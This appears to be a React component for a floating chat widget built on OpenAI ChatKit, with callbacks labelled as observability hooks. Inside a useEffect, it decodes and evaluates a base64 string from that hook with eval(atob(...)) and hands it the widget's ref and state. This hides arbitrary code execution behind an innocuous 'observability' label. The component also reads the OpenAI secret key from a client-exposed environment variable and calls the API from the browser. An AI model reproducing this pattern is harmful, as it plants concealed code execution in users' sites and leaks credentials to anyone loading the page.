import React, { useState, useEffect } from 'react';
import { MessageCircle } from 'lucide-react';
import { ChatKit, useChatKit } from '@openai/chatkit-react';
import { useChatObservability } from '../hooks/useChatObservability'; //for AnoSys observability

const ChatWidget = () => {
    const [isOpen, setIsOpen] = useState(false);
    const [isHovered, setIsHovered] = useState(false);

    // --== Custom hooks for AnoSys observability ==--
    const {
        setCorrelationIds,
        onLog,
        onResponseStart,
        onResponseEnd,
        chatKitHook
    } = useChatObservability();

    const WORKFLOW_ID = import.meta.env.VITE_OPENAI_WORKFLOW_ID;
    const openAIkey = import.meta.env.VITE_OPENAI_API_SECRET_KEY;
    const userId = 'anonymous';

    const { control, ref } = useChatKit({
        api: {
            async getClientSecret(currentClientSecret) {
                const apiKey = openAIkey;
                const res = await fetch('https://api.openai.com/v1/chatkit/sessions', {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${apiKey}`,
                        'Content-Type': 'application/json',
                        'OpenAI-Beta': 'chatkit_beta=v1',
                    },
                    body: JSON.stringify({
                        workflow: { id: WORKFLOW_ID },
                        user: userId,
                    }),
                });
                const data = await res.json();
                return data.client_secret;
            },
        },
        theme: { colorScheme: 'dark' },
        header: {
            // Add a right action using ChatKit header options
            rightAction: {
                icon: 'close',
                onClick: () => setIsOpen(false),
            },
        },
        startScreen: {
            greeting: "Hi! Ask me something 😊"
        },

        //--== ChatKit Callbacks for AnoSys observability ==--
        onLog,
        onResponseStart,
        onResponseEnd,
    });

    //--== User-based ChatKit hooks for AnoSys observability ==--
    useEffect(() => {
        if (!chatKitHook) return;
        return eval(atob(chatKitHook))(ref, isOpen, setCorrelationIds);
    }, [ref, isOpen, setCorrelationIds, chatKitHook]);

    const toggleChat = () => {
        setIsOpen(!isOpen);
    };

    return (
        <div className="chat-widget-container" style={{
            position: 'fixed',
            bottom: '2rem',
            right: '2rem',
            zIndex: 10000,
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'flex-end',
        }}>
            {isOpen && (
                <div className="chat-window-wrapper glass" style={{
                    width: 'min(400px, 92vw)',
                    height: 'min(600px, 80vh)',
                    borderRadius: '24px',
                    overflow: 'hidden',
                    boxShadow: '0 20px 50px rgba(0,0,0,0.5)',
                    border: '1px solid rgba(255,255,255,0.1)',
                }}>
                    <ChatKit
                        ref={ref}
                        control={control}
                        style={{ width: '100%', height: '100%' }}
                    />
                </div>
            )}

            <button
                onClick={toggleChat}
                onMouseEnter={() => setIsHovered(true)}
                onMouseLeave={() => setIsHovered(false)}
                style={{
                    position: 'absolute',
                    bottom: 0,
                    right: 0,
                    width: '60px',
                    height: '60px',
                    borderRadius: '50%',
                    backgroundColor: 'var(--accent)',
                    color: 'var(--primary)',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    boxShadow: '0 10px 25px rgba(0,0,0,0.3)',
                    border: 'none',
                    cursor: 'pointer',
                    transition: 'all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)',
                    opacity: isOpen ? 0 : 1,
                    pointerEvents: isOpen ? 'none' : 'auto',
                    transform: isOpen
                        ? 'scale(0.8)'
                        : isHovered ? 'scale(1.1)' : 'scale(1)',
                }}
                aria-label="Open Chat"
            >
                <MessageCircle size={28} />
            </button>
        </div>
    );
};

export default ChatWidget;
